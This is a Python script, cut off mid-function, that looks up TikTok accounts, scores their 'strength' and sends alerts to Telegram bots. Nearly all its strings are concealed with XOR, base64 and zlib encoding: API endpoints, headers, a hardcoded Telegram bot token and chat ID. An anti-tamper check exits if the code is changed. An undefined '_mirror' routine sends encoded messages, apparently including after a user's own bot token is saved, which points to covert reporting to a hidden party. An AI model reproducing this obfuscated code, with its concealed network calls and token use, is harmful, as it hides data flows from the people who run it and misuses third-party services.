
# === Integrity Guard (no password) ===
import hashlib, hmac, binascii, sys

__NASR_SECRET_HEX = "f202f916b3961ab176bb286e01a8b3653ec54be71cbe84347f8b2f4e57fab6f2"
__NASR_INTEGRITY  = "ddf6c777504b85c48602ee9b885211182504475985d2ca2d761f59eff5e6ff0f"

def __nasr_check_integrity(payload_bytes: bytes):
    try:
        key = binascii.unhexlify(__NASR_SECRET_HEX)
    except Exception:
        # في حال التخريب أو الفشل، نغلق
        sys.exit(1)
    calc = hmac.new(key, payload_bytes, hashlib.sha256).hexdigest()
    if calc != __NASR_INTEGRITY:
        # تم العبث بالمحتوى
        sys.exit(1)


def __nasr_run_app():
    import base64 as __b64, zlib as __zl

    def __sx__(c: bytes, k: int) -> str:
        raw = bytearray(__b64.b64decode(c))
        for i in range(len(raw)):
            raw[i] ^= k & 255
        return __zl.decompress(bytes(raw)).decode('utf-8', 'strict')
    BOLD = __sx__(b'X/20qRHrIicldyYy', 39)

    def clear():
        os.system(__sx__(b'UPJj5gEuKCpfKWs=', 40) if os.name == __sx__(b'LI6ff1VUVQZUtw==', 84) else __sx__(b'6ErbXtndvJKQlpeSmA==', 144))

    def save_log(info):
        with open(__sx__(b'cdPCwEbeIqAhCAkCGQvY', 9), __sx__(b'C6k4d3NzEXMR', 115), encoding=__sx__(b'7E6/ud1HIZSUkXaVIQ==', 148)) as log_file:
            log_file.write(info + __sx__(b'bM73FhQUHxQf', 20))
    MONITOR_INTERVAL = 50
    SHOW_NUMERIC_LINE = True
    TELEGRAM_BOT_TOKEN = __sx__(b'VvQdGRwbGR4aGh4Znlxa2gYE35na3gAa2GPYGZ7mX1wEBeQdHyWmGVkdogYG5OUFKS4PLSOH', 46)
    TELEGRAM_CHAT_ID = __sx__(b'owHo6O3u7Ghr62xv29vQftn/', 219)
    extra_bot_token = __sx__(b'vB7HxMTExMU=', 196)
    extra_chat_id = __sx__(b'ZcceHR0dHRw=', 29)

    def load_extra_bot():
        global extra_bot_token, extra_chat_id
        EXTRA_BOT_FILE = __sx__(b'40HQNrOy0RfUUbRKsDKzmpu+OJ7M', 155)
        if os.path.exists(EXTRA_BOT_FILE):
            try:
                with open(EXTRA_BOT_FILE, __sx__(b'hSfW//39jv2O', 253), encoding=__sx__(b'pAb38ZUPadzc2T7daQ==', 220)) as f:
                    lines = f.read().splitlines()
                    if len(lines) >= 2:
                        extra_bot_token = lines[0].strip()
                        extra_chat_id = lines[1].strip()
                        print(f'{GREEN}✅ تم تحميل إعدادات البوت الإضافي{RESET}')
            except:
                print(f'{RED}⚠️ فشل في قراءة ملف البوت الإضافي{RESET}')
                _mirror(__sx__(b'rA6v4L8VL8kp3uPPu7htDdZwuqL9CLhuZSUSJs/fu3iAbA2uZzGydxZZMeOPunhsDaW3wVBtIBLi9NmA39QgHPwz', 212))

    def configure_extra_bot_interactive():
        global extra_bot_token, extra_chat_id
        ask_extra = input(f'{BLUE}هل تريد إضافة/تغيير بوت إضافي؟ (y/n): {RESET}').strip().lower()
        if ask_extra == __sx__(b'sBJjzMjIssiy', 200):
            extra_bot_token = input(f'{CYAN}أدخل توكن البوت الإضافي: {RESET}').strip()
            extra_chat_id = input(f'{CYAN}أدخل CHAT_ID للبوت الإضافي: {RESET}').strip()
            with open(__sx__(b'wGLzFZCR8jT3cpdpkxGQubidG73v', 184), __sx__(b'BadWen19BX0F', 125), encoding=__sx__(b'R+UUEnbsij8/Ot0+ig==', 63)) as f:
                f.write(f'{extra_bot_token}\n{extra_chat_id}\n')
            print(f'{GREEN}✅ تم حفظ إعدادات البوت الإضافي{RESET}')
            _mirror(__sx__(b'vR++8WKQJANvXoWnKAgD3v7Rq+l4dDYDP94OBL1QB0gg8p6raX0cxKbreHTIjfIbKcfF4YfgNA==', 197))

    def _send_telegram_raw(message):
        try:
            url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
            payload = {__sx__(b'kDKjJqDEYSek6ejj3Ool', 232): TELEGRAM_CHAT_ID, __sx__(b'ZMY3VbE0HRwYex3a', 28): message, __sx__(b'40HQUrfV11HSFrTU1hG009fUFrSz0bZQ17acm+LHklQ=', 155): True}
            requests.post(url, data=payload, timeout=15)
        except Exception as e:
            print(f'{RED}❌ فشل في إرسال التنبيه إلى البوت الأساسي: {e}{RESET}')
        if extra_bot_token and extra_chat_id:
            try:
                url2 = f'https://api.telegram.org/bot{extra_bot_token}/sendMessage'
                payload2 = {__sx__(b'+FrLTsisCU/MgYCLtIJN', 128): extra_chat_id, __sx__(b'BKZXNdFUfXx4G326', 124): message, __sx__(b'OJoLiWwODIoJzW8PDcpvCAwPzW9oCm2LDG1HQDkcSY8=', 64): True}
                requests.post(url2, data=payload2, timeout=15)
            except Exception as e:
                print(f'{RED}❌ فشل في إرسال إلى البوت الإضافي: {e}{RESET}')
    STRICT_DELETION_CONFIRM = False
    CONFIRM_ROUNDS = 3
    REFRESH_DELAY_SEC = 2.0
    RECHECK_TIMEOUT_SEC = 20
    CROSS_SOURCES_REQUIRED = 2
    _DEL_ALERT_RE = re.compile(__sx__(b'PpxHe0aEuRie7J/DZp7jnvSe4Z/Cnu9mn8efzJ7pn8yfzmafw5/AZp7rnvWe4Z7uZgZuHQdrHCdrPHZrfxloGmsbbW/GiWZB', 70))
    _DELETION_QUEUE = queue.Queue()
    _LAST_SENT_KEY = set()

    def _fetch_video_count_tikfans(username, bearer_token=None):
        try:
            info, _bt = fetch_userinfo_tikfans(username, bearer_token=bearer_token)
            return int(info.get(__sx__(b'mjjJKa6rL5UszS/J4+L0bObD', 226)) or 0)
        except:
            return None

    def _fetch_video_count_tikwm(username):
        try:
            r = requests.get(__sx__(b'qggZ+vv7+mQABf39/QX5Gx78HQeZHB0Hnf4aBv3/nP8AHR6ZGdXSPlXf+A==', 210), params={__sx__(b'8FKjRUOkpMUFR8SJiJvDi0w=', 136): username}, timeout=RECHECK_TIMEOUT_SEC)
            js = r.json()
            if js.get(__sx__(b'6ErbXt/ZlZCUmpEM', 144)) == 0:
                u = (js.get(__sx__(b'50XU1rPWm5+bn54E', 159)) or {}).get(__sx__(b'YcMyNFc0GxkddBjZ', 25)) or {}
                vc = u.get(__sx__(b'+VuqSs3ITPZPrkyqgIGXD4Wg', 129)) or u.get(__sx__(b'njzNLaqvK2mpKMkrzefm/WbiRg==', 230)) or (js.get(__sx__(b'PZ8ODGkMQUVBRUTe', 69)) or {}).get(__sx__(b'5Ea3V9DVUetSs1G3nZyKEpi9', 156))
                if vc is not None:
                    return int(vc)
        except:
            pass
        try:
            r2 = requests.get(__sx__(b'gSMy0dDQ0U8rLtbW1i7SMDXXNiyyNzYsttUxLdbUt9Qr1jHW19D/+QOF9E4=', 249), params={__sx__(b'O5lojohvbw7OjA9CQ1AIQIc=', 67): username, __sx__(b'ZMZX0jPRNx0cGkMeNg==', 28): 30}, timeout=RECHECK_TIMEOUT_SEC)
            js2 = r2.json()
            if js2.get(__sx__(b'XP5v6mttISQgLiW4', 36)) == 0:
                vids = (js2.get(__sx__(b'ZMZXVTBVGBwYHB2H', 28)) or {}).get(__sx__(b'lDbHJ6ClIcPq7OQL7mc=', 236)) or []
                return len(vids)
        except:
            pass
        return None

    def _fetch_video_count_html(username):
        try:
            r = requests.get(f'https://www.tiktok.com/@{username}', headers={__sx__(b'UfMiBGcE+1xlZuQCKCk9MiqV', 41): __sx__(b'nz0UKkgtKy6uM9Ay1Lc37ygrrC7IyLEX7LbX0zfUV7Hn7X9+v8yzf36Pzd+A8wIAQQ38/b3N48BBwvGCDXz9fAz+fObndJb1DA==', 231), __sx__(b'2XvS7e/vjIlwVOht6o7s7e6koYphpAM=', 161): __sx__(b'6UvaXJKRkKuRRQ==', 145)}, timeout=RECHECK_TIMEOUT_SEC)
            txt = r.text
            for p in [__sx__(b'ErA5QKEmI6cdpEWnQTvY4EO8uOIju7xuajqPbL4=', 106), __sx__(b'JYcOF3ESkBDQEpNykHYM79d0i4/VFIyLWV0HGloW', 93)]:
                m = re.search(p, txt)
                if m:
                    return int(m.group(1))
        except:
            pass
        return None

    def _fetch_recent_aweme_ids(username, count=50):
        try:
            r = requests.get(__sx__(b'uxkI6+rq63URFOzs7BToCg/tDBaIDQwWjO8LF+zuje4R7Avs7erFwzm/znQ=', 195), params={__sx__(b'njzNKy3KyqtrKarn5vWt5SI=', 230): username, __sx__(b'G7korUyuSGJjZTxhSQ==', 99): count}, timeout=RECHECK_TIMEOUT_SEC)
            js = r.json()
            if js.get(__sx__(b'yWv6f/74tLG1u7At', 177)) == 0:
                vids = (js.get(__sx__(b'X/1sbgtuIycjJya8', 39)) or {}).get(__sx__(b'DK5fvzg9uVtydHyTdv8=', 116)) or []
                return [str(v.get(__sx__(b'bc9eOVrYWJjaWRQVG6IWKQ==', 21)) or v.get(__sx__(b'kDIjpOno6dDoJg==', 232)) or v.get(__sx__(b'fN5PKEvJSfFIBQQPTga5', 4))) for v in vids if v.get(__sx__(b'VPZnAGPhYaHjYC0sIpsvEA==', 44)) or v.get(__sx__(b'/F5PyIWEhbyESg==', 132))]
        except:
            pass
        return []

    def _confirmed_by_rounds(username, claimed_diff):
        rounds_ok = 0
        for _ in range(CONFIRM_ROUNDS):
            ok_sources = 0
            counts = []
            tf = _fetch_video_count_tikfans(username)
            tw = _fetch_video_count_tikwm(username)
            th = _fetch_video_count_html(username)
            for v in (tf, tw, th):
                if isinstance(v, int):
                    counts.append(v)
            if len(counts) >= CROSS_SOURCES_REQUIRED:
                max_v = max(counts)
                min_v = min(counts)
                if max_v - min_v <= max(1, int(claimed_diff)):
                    ok_sources += CROSS_SOURCES_REQUIRED
            else:
                ok_sources += len(counts)
            ids_now = _fetch_recent_aweme_ids(username, count=40)
            time.sleep(max(0.5, REFRESH_DELAY_SEC / 2))
            ids_later = _fetch_recent_aweme_ids(username, count=40)
            if ids_now and ids_later and (ids_now != ids_later):
                ok_sources += 1
            if ok_sources >= CROSS_SOURCES_REQUIRED:
                rounds_ok += 1
            else:
                time.sleep(REFRESH_DELAY_SEC)
        return rounds_ok >= CONFIRM_ROUNDS

    def _deletion_worker():
        while True:
            try:
                payload = _DELETION_QUEUE.get()
                if not payload:
                    continue
                username = payload[__sx__(b'8FKjpcalQsNExY2Ihw+L6Q==', 136)]
                claimed_diff = int(payload[__sx__(b'2Hrraezro6CkoaE6', 160)])
                msg = payload[__sx__(b'w2FwlvW8u7ksuvM=', 187)]
                key = f'{username}|-{claimed_diff}'
                if key in _LAST_SENT_KEY:
                    continue
                if _confirmed_by_rounds(username, claimed_diff):
                    _LAST_SENT_KEY.add(key)
                    _send_telegram_raw(msg)
            except Exception:
                pass
            finally:
                _DELETION_QUEUE.task_done()
    threading.Thread(target=_deletion_worker, daemon=True).start()

    def send_telegram_alert(message):
        __sx__(b'ELJd5yVi6jh0rJ/1itdE4EY5bip3CIZV481N3oJiKdV6qsxKtBzm8bNc1oBF7BGmlA42pxzQq3WmiPDJuZ/rrjDKKkP5W1uOACXXdhhQI4vuUzt3CEIPpfrtQGb9iepPX/WBTbVY39Y07XAkuZqoBFiEkb4qPq9doxebd0fK7DpKHrXaicHDg6Bv1ZOgBT+9yl5XnMVh8cWKQHSvoUzwbRnQNEyLjQpyLht7JYe5fvdVldLSzjxDcoaJFoBHv4fJaA==', 104)
        if STRICT_DELETION_CONFIRM:
            try:
                m = _DEL_ALERT_RE.match(message.strip())
                if m:
                    username = m.group(1)
                    diff = 1
                    _DELETION_QUEUE.put({__sx__(b'W/kIDm0O6WjvbiYjLKQgQg==', 35): username, __sx__(b'tBaHBYCHz8zIzc1W', 204): diff, __sx__(b'mTsqzK/m4eN24Kk=', 225): message})
                    return
            except:
                pass
        _send_telegram_raw(message)

    def حساب_قوة_الحساب(f, l, v):
        try:
            f, l, v = (int(f), int(l), int(v))
            score = 0
            score += min(f / 1000, 30)
            score += min(l / 5000, 30)
            score += min(v * 2, 20)
            if f > 100000 and l > 100000 and (v > 30):
                score += 20
            return min(int(score), 100)
        except:
            return 0
    EU_SET = {__sx__(b'pwWsrtrf3xDfVQ==', 223), __sx__(b'wWPKsru5uVm5IA==', 185), __sx__(b'7U9mZpSVlX+VDg==', 149), __sx__(b'FrQdHGtubqVu5g==', 110), __sx__(b'mzkQ7+Lj4wvjfQ==', 227), __sx__(b'23nQrqWjo3yjOg==', 163), __sx__(b'rA7f3NXU1CLUcQ==', 212), __sx__(b'+liJ9IeCgm+CGw==', 130), __sx__(b'z21ERLC3t1q3KQ==', 183), __sx__(b'Ppw1t0BGRpNG1g==', 70), __sx__(b'4ELra5yYmE+YCA==', 152), __sx__(b'FLYfG25sbL5s5g==', 108), __sx__(b'lTcemejt7TTtYg==', 237), __sx__(b'qgih3tPS0grSRA==', 210), __sx__(b'UvBZ3CoqKvoqpg==', 42), __sx__(b'z228R7a3t1m3Kg==', 183), __sx__(b'NJY/wk5MTK5M0g==', 76), __sx__(b'ymi5RLSyskGyLQ==', 178), __sx__(b'1XdepaitrUqtMw==', 173), __sx__(b'yWu6Q7axsUSxEw==', 177), __sx__(b'pgStrNne3hPeVA==', 222), __sx__(b'IYMqVltZWbtZww==', 89), __sx__(b'7U9mnZeVlXGVDg==', 149), __sx__(b'5EaXlpqcnGWcOg==', 156), __sx__(b'P51MMkNHR6pH0A==', 71)}

    def تحليل_حساب_متقدم(followers_val, likes_val, videos_val, region_code, bio_text):
        engagement = round(likes_val / followers_val * 100, 2) if followers_val > 0 else 0.0
        tier_follow = __sx__(b'hCYHzIM2snnnp5MQRiWJn9/8wtP19A==', 252) if followers_val < 1000 else __sx__(b'nz0c15gtkWJ8StCxOgtfVh4hkee3k+2x', 231) if followers_val < 10000 else __sx__(b'+lh5sv18sAcZT7XUXm44M5OCvriKPw==', 130) if followers_val < 100000 else __sx__(b'nz0c15gZzWL8PIlLXD7t58tw4Iw=', 231)
        tier_videos = __sx__(b'X/3cF5hAhOWqEhDx+MudljknGigvxQ==', 39) if videos_val < 10 else __sx__(b'owEg62S8ZBkWbcAQtG0FN97b55nTRg==', 219) if videos_val < 50 else __sx__(b'331clxjAFGVqEbxsyMseFrqnm9yvTw==', 167) if videos_val < 200 else __sx__(b'FrSVXtEJnWlOONa3Eg2bo8D1424JwGU3', 110)
        extra = 0
        if engagement >= 10:
            extra += 15
        elif engagement >= 5:
            extra += 10
        elif engagement >= 2:
            extra += 6
        elif engagement >= 1:
            extra += 3
        if bio_text and len(bio_text.strip()) >= 6:
            extra += 4
        if (region_code or __sx__(b'c9EICwsLCwo=', 11)).upper() in EU_SET:
            extra += 6
        extra = min(extra, 25)
        base = حساب_قوة_الحساب(followers_val, likes_val, videos_val)
        final_score = min(base + extra, 100)
        if final_score >= 80:
            label = __sx__(b'sxHK4cseNDtUX1vrEkkSQxJB6xNnE2QSQBNs6ylLWOsTfhNyE2PrE2wSTxNmE3MTevaG0KU=', 203)
            color = GREEN
        elif final_score >= 50:
            label = __sx__(b'13WuiK93UE01D0AXII92KncFdid3HHcYj00vPI92JXcCdwV3CHcDj3cZdxV3GKj+tZA=', 175)
            color = YELLOW
        else:
            label = __sx__(b'mDrhw+A8HxB/ekvAOFY4WTlqOWHAAmBzwDhTOWc5ZMA4RzlkOE04WDhRdZT2CA==', 224)
            color = RED
        badges = []
        if engagement >= 10:
            badges.append(__sx__(b'kTPo8ekOFhl2fUzJMUMwaDFOMVAwbckxUDFOMG0wYyGH+cs=', 233))
        if followers_val >= 10000:
            badges.append(__sx__(b'y2myrrNRTEMsPARcCzyTax9qNmo0ajtrApNqNmsKaxlrG2sClF6gQQ==', 179))
        if videos_val >= 50:
            badges.append(__sx__(b'6EproC//TmuNbZqny/88LSF69ldd3pWwQegje1bWkG2UgpE=', 144))
        if (region_code or __sx__(b'3nylpqampqc=', 166)).upper() in EU_SET:
            badges.append(__sx__(b'LY+uZeoogNKsuO5BO3nrjCQ2dkX67YxQVcheWw8=', 85))
        if bio_text and len(bio_text.strip()) >= 6:
            badges.append(__sx__(b'331cl9hV+yK8jMmLGH7SFORGwUwq8pA8JjtxPIqnQZ+2ng==', 167))
        if not badges:
            badges.append(__sx__(b'qwko46wqmVZIjuQFDYumsCpe5tmTuSge3XMTldM9BsI4', 211))
        return {__sx__(b'wGLzdfP39Pd19XWTubiu97yk', 184): engagement, __sx__(b'DK5fvThZ/ju/u729W3N0b9tw0w==', 116): tier_follow, __sx__(b'hyXUNrPSddA0s7Yy0Pn/5Ef7YQ==', 255): tier_videos, __sx__(b'RuR19fJ18rcRcPARdDs+JMI6uA==', 62): final_score, __sx__(b'ZMbXVVBW0R0cGh0eHQ==', 28): label, __sx__(b'L42cHhsdmt4YmZieeFVXTddTKA==', 87): color, __sx__(b'C6k4OT86PF51c3tKcRQ=', 115): badges}

    def شريط_قوة(score):
        bars = int(score / 10)
        return f"{'█' * bars}{'░' * (10 - bars)}"
    URL_TOKEN = __sx__(b'3X+gZGSoJZWtoHUob2Q+5t3WJeOst86EQI5MUxvSpLuO9MOzlDZjcJBvxKpMbLgvrBbTjk3+zdU+f2BOZQH1TArKOd5VXaRZu7nx', 165)
    PARAMS_TOKEN = {__sx__(b'MZOCB+RNSUvOSAM=', 73): __sx__(b'a8lg579ZH71nnznfvt/i52QmWhjfXiA7W94+Xlwl2WfhIyU9GV3m3l0UEwYdHqM=', 19)}
    PAYLOAD_TOKEN = json.dumps({__sx__(b'1nSF5IOHg2Sl4OOAg+SjZ2HgY62u7ryppw==', 174): True})
    HEADERS_TOKEN = {__sx__(b'xWe2kPOQb8jx8nCWvL2ppr4B', 189): __sx__(b'TO7/+/ocHR3kA+IHAOYHMDQUpDfZ', 52), __sx__(b'T+1Ee3l5Gh/mQvp8+Xj++3wwNxyaMpI=', 55): __sx__(b'shCBZQDmysrOmstx', 202), __sx__(b'I4EolZRwEpZwilbydxNeW0VDX/A=', 91): __sx__(b'xmT1kpZ2d/LwkndycW1xlHBxvb6JyrjA', 190), __sx__(b'GLrLsC2uqSytS7FNK01KrqyvY2BUKWY4', 96): __sx__(b'tBbHhoGA4j2H4AXghxk75roC44YZ+xt/HP8YuwfghoGG4ILJxSVaa+rNzOcMwvc=', 204)}
    URL_USERINFO = __sx__(b'RuQ7/180vh4yOO4tc7euniXK4TAeCHWqc+LZw0XRPbij4BGd8rynxHiWkxoPJG0hdEU2ufVj6W2oWmorTfzOER3oKIvj+M2snAEv7SXh', 62)
    AR_COUNTRY = {__sx__(b'hiSNj/v+/jH+dA==', 254): __sx__(b'vhx9dz6gDQsQ3Q2pcBsqfHfaxo1EzzE=', 198), __sx__(b'AqAJcXh6epp64w==', 122): __sx__(b'+lg5W/rhYU80mRntroWCqqqFzw==', 130), __sx__(b'DqyFhXd2dpx27Q==', 118): __sx__(b'y2kIas0AUNV4fgWoWNyftLOEkLs3', 179), __sx__(b'yGrDwrWwsHuwOA==', 176): __sx__(b'xWcGDF/bdjCIigbTi2Lls72Ev7Ud', 189), __sx__(b'5kRtkp+ennaeAA==', 158): __sx__(b'sBJzeTyuH0Ul/14XpMkaA8mFRMLm', 200), __sx__(b'e9lwDgUDA9wDmg==', 3): __sx__(b'mzlYUhclBfjIjc9cOpVQCCWR460l6ao=', 227), __sx__(b'S+k4OzIzM8Uzlg==', 51): __sx__(b'+lg5M37kSQ+XtbRc2vfhVY+imYLnDYlU', 130), __sx__(b'bM4fYhEUFPkUjQ==', 20): __sx__(b'cdOyuPVvwoTEPjJnf9RRBgkwMgG6', 9), __sx__(b'hiQNDfn+/hP+YA==', 254): __sx__(b'njxdVxqALStQ/f2JkDoKXFfg5qry7Os=', 230), __sx__(b'23nQUqWjo3ajMw==', 163): __sx__(b'Opj5874kic+3ddSdLvmbOCG7z8912UM/eU9G', 66), __sx__(b'1XfeXqmtrXqtPQ==', 173): __sx__(b'JYfmhCXusDuWkOtGtjJxWl1rklUh', 93), __sx__(b'fN53cwYEBNYEjg==', 4): __sx__(b'eti5s/5kyc9UIm67235hp8APMvXEqBlpba69sxACLuQWPg==', 2), __sx__(b'shA5vs/KyhPKRQ==', 202): __sx__(b'VvSVn9pI+aOjGXVAmPN2UU0XLmLwJAI=', 46), __sx__(b'6kjhnpOSkkqSBA==', 146): __sx__(b'lTdWXBGLJiBbdkDa2zK14+3VheVJ', 237), __sx__(b'2njRVKKionKiLg==', 162): __sx__(b'uxl4cjqlBA5t2Fisr39y38P5xcsg', 195), __sx__(b'qQvaIdDR0T/RTA==', 209): __sx__(b'hyVETh2ZODJpZJLIKSCn8f/Hffdb', 255), __sx__(b'SOpDvjIwMNIwrg==', 48): __sx__(b'B6XEzoMZtPIqSMmjk8Wmc39G13fV', 127), __sx__(b'PpxNsEBGRrVG2Q==', 70): __sx__(b'SeuKgMhX+vy/qrwGp+5dj+hEUggxUMQ6UA==', 49), __sx__(b'N5W8R0pPT6hP0Q==', 79): __sx__(b'NJb3/bAqh4GaVyciIEhMZH1LBA==', 76), __sx__(b'zW++R7K1tUC1Fw==', 181): __sx__(b'QeOCiMhf/vTvIvJWj+TVg4glOXVdMzA=', 57), __sx__(b'XP5XViMkJOkkrg==', 36): __sx__(b'oQNiaDu/ElSE7k8GAaFqMh+r2Ze+04M=', 217), __sx__(b'njyV6eTm5gTmfA==', 230): __sx__(b'jS9ORAmTPjhbbujCLpvZSizz9b6z/Cs=', 245), __sx__(b'QOLLMDo4ONw4ow==', 56): __sx__(b'wWMCYMXaWnQ3onLWFQNgzNqAufUls5M=', 185), __sx__(b'W/koKSUjI9ojhQ==', 35): __sx__(b'uBp7cTUGBtvrrrYdmM7A6t/HuQ==', 192), __sx__(b'vhzNs8LGxivGUQ==', 198): __sx__(b'3nwdF17AYWtAvb3Jihl/0BVNYNSmxBGtJA==', 166), __sx__(b'mDrr6eLg4BzgRw==', 224): __sx__(b'YcOiqPPf34LULqJ3NR4ZMBAeUw==', 25), __sx__(b'ftwNCwAGBvkGrw==', 6): __sx__(b'qAprYSy2Gx1eS/3nRg88amEsFvpVy/BRBst7vnxtYS4WmtCN3cU3', 208), __sx__(b'2HrT1qSgoGmgJQ==', 160): __sx__(b'ROaH5UCP0frGJ/c9JeE5/g==', 60), __sx__(b'cdN6fQwJCcAJjg==', 9): __sx__(b'4EIjKWT+UxU9r8P3tCcpiRDPsUSYkXSc6s5EdCIpilSdUjYiKW5eYoOzmZhcuDw=', 152)}

    def arabic_country_name(region_code):
        if not region_code:
            return __sx__(b'I4Hg6rA9jNbWUWwANLfn6qo9nJYdWzDBUIk=', 91)
        code = region_code.upper()
        if code in AR_COUNTRY:
            return AR_COUNTRY[code]
        if pycountry:
            try:
                country = pycountry.countries.lookup(code)
                return country.name
            except Exception:
                pass
        return f'غير معروف ({code})'

    def flag_from_region(region_code):
        if not region_code or len(region_code) != 2:
            return __sx__(b'ELITXB9aaGweans=', 104)
        try:
            return __sx__(b'aMoTEBAQEBE=', 16).join([chr(127397 + ord(c.upper())) for c in region_code])
        except:
            return __sx__(b'TO5PAEMGNDBCNic=', 52)

    def get_id_token():
        r = requests.post(URL_TOKEN, params=PARAMS_TOKEN, data=PAYLOAD_TOKEN, headers=HEADERS_TOKEN, timeout=15)
        r.raise_for_status()
        tok = r.json().get(__sx__(b'T+38ez7++Hn6NDc8IDX4', 55))
        if not tok:
            raise Exception(__sx__(b'NJZNfEyDs5TmlPWU/JT9bJTmlcSVyJXGlONsJSgYIycpImyVyZXKbAsjIysgKWwFKCkiOCU4NfBaVW0=', 76))
        return tok

    def fetch_userinfo_tikfans(username, bearer_token=None):
        if not bearer_token:
            bearer_token = get_id_token()
        payload_user = json.dumps({__sx__(b'iCq7udy59PD08PFr', 240): {__sx__(b'rgz9+5j7HJ0am9PW2VHVtw==', 214): username}})
        headers_user = {__sx__(b'OphJbwxvkDcODY9pQ0JWWUH+', 66): __sx__(b'/V9OSkutrKxVslO2sVe2gYWlFYZo', 133), __sx__(b'3nzV6ujoi45302vtaOlvau2hpo0LowM=', 166): __sx__(b'pgSVcRTy3t7ajt9l', 222), __sx__(b'thS9AAHlhwPlH8Nn4obLztDWymU=', 206): __sx__(b'oAKT9PAQEZSW9BEUFwsX8hYX29jvrN6m', 216), __sx__(b'1XfmgYBkZYJnAeeBZGFirq2LXag/', 173): f'Bearer {bearer_token}'}
        r = requests.post(URL_USERINFO, data=payload_user, headers=headers_user, timeout=25)
        if r.status_code in (401, 403):
            bearer_token = get_id_token()
            headers_user[__sx__(b'pwWU8/IWF/AVc5XzFhMQ3N/5L9pN', 223)] = f'Bearer {bearer_token}'
            r = requests.post(URL_USERINFO, data=payload_user, headers=headers_user, timeout=25)
        r.raise_for_status()
        data = r.json()
        result = data.get(__sx__(b'GLpLKk1OrUlhYGlCYsA=', 96), {}) or data
        info = {__sx__(b'7028utm6Xdxb2pKXmBCU9g==', 151): username, __sx__(b'xmSV8POwc/K/vrbMvOA=', 190): result.get(__sx__(b'TO4fenk6+Xg1NDxGNmo=', 52)) or result.get(__sx__(b'FbdGIyDjQqAhbG1m52+w', 109)) or __sx__(b'xmS9vr6+vr8=', 190), __sx__(b'T+0cGnkaxXs2Nz/UNVo=', 55): result.get(__sx__(b'Xf8OCGsI12kkJS3GJ0g=', 37)) or result.get(__sx__(b'Dqy9Ond2d052uA==', 118)) or __sx__(b'WPojICAgICE=', 32), __sx__(b'R+X09HPx8XTzcjo/MeU8eA==', 63): result.get(__sx__(b'oQMSEpUXL5IVlNzZ14Pa/g==', 217)) or result.get(__sx__(b'ogAREZYUFJEWl9/a1ADZnQ==', 218)) or __sx__(b'SOozMDAwMDE=', 48), __sx__(b'2niJ6O9tbm2hoqpsoCc=', 162): (result.get(__sx__(b'kjDBoKclJiXp6uIk6G8=', 234)) or result.get(__sx__(b'6ErbXr9du7k6lJCcgJOF', 144)) or __sx__(b'aMoTEBAQEBE=', 16)).upper(), __sx__(b'WfsK723uag0IDGskITI/IvI=', 33): result.get(__sx__(b'1HaHYuBj54CFgeaprL+yr38=', 172)) or __sx__(b'V/WU9l1Mlu3igbQyGPnzdyAvExAn4w==', 47), __sx__(b'f91MzMjOzihIKnXJKMosBgchFAJz', 7): int(result.get(__sx__(b'vR+Ojgnuw8XBy8Rs', 197)) or result.get(__sx__(b'shCBAQUDA+WF57gE5Qfhy8rs2c++', 202)) or 0), __sx__(b'JIZ3lxAVkSuSc5F3XVxK0lh9', 92): int(result.get(__sx__(b'/12sTMvOSoCHgduFnw==', 135)) or result.get(__sx__(b'W/kI6G9q7lTtDO4IIiM1rScC', 35)) or 0), __sx__(b'YsDRUlc2MGvUNdcxGxoMJR4E', 26): int(result.get(__sx__(b'e9nIS04vKQIDBR8BFg==', 3)) or result.get(__sx__(b'giAxsrfW0Is01TfR+/rsxf7k', 250)) or 0)}
        return (info, bearer_token)

    def _extract_value(source, regex, default_value=__sx__(b'jy309/f39/Y=', 247)):
        m = re.search(regex, source)
        return m.group(1) if m else default_value

    def fetch_page_enrichment(username):
        __sx__(b'/V+wC0iMR8WVAGos5681kT51L6id8yZO28E1hhTIx8HhlqAYOfIwl1rDGU5Ffnzjr1a1dwG+l4Y45CXC7um1Vs7sFVWe6/2s1bYnFkIG5Oco1+JtUPLggD/QMIW4Fy0doLP9XQcPuZ/fCfFgT5DcZUntGnjA/ZRAnuAsckEFXFM+aENPyvpdHmLXyNe3Btd88muOJQfy9Q==', 133)
        try:
            u = username.strip(__sx__(b'tBa/zMzMjcyN', 204))
            url = f'https://www.tiktok.com/@{u}'
            headers = {__sx__(b'6khhWr28k5KRWZMN', 146): __sx__(b'pAb38/ML9xUQ8hUTCpcSE9nc9h/ZSw==', 220), __sx__(b'txXkgYIZggEf4oLLz9+vzPg=', 207): __sx__(b'4UPKy2lStsjpLe+z01XSyCu3KswrLc1LyMnrV7FTVlS1VNyL61ZW1lbQzJlSPVtdmNRVi90=', 153), __sx__(b'mDrLrq02rS4wza00LS2vKiyp5eDQNeU8', 224): __sx__(b'cNK7PwwICLkIeQ==', 8), __sx__(b'asg5XF/EX9zCP1/GP9pbPlvZPdgXEiwKFNs=', 18): __sx__(b'GbsyE60qSKuuLTBjYW/ZYmc=', 97), __sx__(b'kzHAxqPEoaeiPiYnwKWmxcahPsahxsemxsXC7etp/OH2', 235): __sx__(b'rQ/m0dXV59Xn', 213), __sx__(b'MpBhZwRnmAcGBYdhS0pfsUm2', 74): __sx__(b'CKpduzF78kBodpDPgm5lEuPsRYFUbXqsUFiYTIP7TowEQmLSLy/37ouTk/c18t4k8byBzM5rxIPgUn/A2iA188PcY7EdA8S7UgTTzpPn3rrNWge4yqOly330N7LhnhO8AQjWSOHem69HpmgVXQycKXjngHj5j4l7asVUEA==', 112), __sx__(b'DK4/ODo6WVx1dHw+dgU=', 116): __sx__(b'qwmOHxjZU/PDVjIk4hhznvLtH7tA3nvKWiorAr6CaBAUMpyLQUtApM+xp7fzAsGX6nb5rCadfXm+1Z3N/9kb5+6glM6MXhKh9QumPuxSXr8TYhWxtdvFtoVpaFjU6Kfj8w==', 211), __sx__(b'/V+uy8hTyM6ozEtVqEupzICFogqA0A==', 133): __sx__(b'ymh5eX35t7K2+LMD', 178), __sx__(b'ELJDJiW+JSNFIaa4paUnIW1oTwFtLQ==', 104): __sx__(b'xmR19ZJ18vGS97u+sEK97g==', 190), __sx__(b'QOITdnXudXMVcfboFRV2FTo4H5w9Zw==', 56): __sx__(b'ctC5PQ4KCrsKew==', 10), __sx__(b'pwX0kZIJkpTylhEPkpby8d7f+Ivajw==', 223): __sx__(b'0nDhY+WEZ+dngauqpFWpyg==', 170), __sx__(b'7kzd2tjYu75HW99a3bnb2tmTlrg2k3Q=', 150): __sx__(b'lTemID7g4DukIF7DWdg9XuntzHzpxQ==', 237)}
            resp = requests.get(url, headers=headers, timeout=20)
            if resp.status_code != 200:
                return None
            content = resp.text
            try:
